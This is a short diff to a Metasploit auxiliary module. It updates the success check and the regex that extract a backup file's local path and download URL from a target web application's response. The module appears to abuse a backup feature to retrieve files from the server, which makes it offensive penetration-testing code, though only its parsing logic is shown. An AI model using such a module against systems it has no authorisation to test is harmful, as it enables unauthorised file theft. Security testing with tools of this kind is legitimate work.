@@ -90,8 +90,8 @@ class Metasploit3 < Msf::Auxiliary
       'vars_post' => vars_post
     })
 
-    if res and res.code == 200 and res.body and res.body.include?('File backup created:')
-      match = res.body.match(%r{<strong>File backup created: </strong>\s+<br/>\s+([^<]+)<br/>\s+<a class="btn btn-success" href="([^"]+)" title="Download this file">Download this file</a>})
+    if res and res.code == 200 and res.body and res.body.include?('Download this file')
+      match = res.body.match(%r{<div class="updater-background">\s+<p class="success " style="text-align: left;">\s+<strong>[^<]+</strong>\s+<br/>\s+([^<]+)<br/>\s+<a class="btn btn-success" href="([^"]+)" title="Download this file">Download this file</a>})
       if match
         local_path = match[1]
         download_url = match[2]
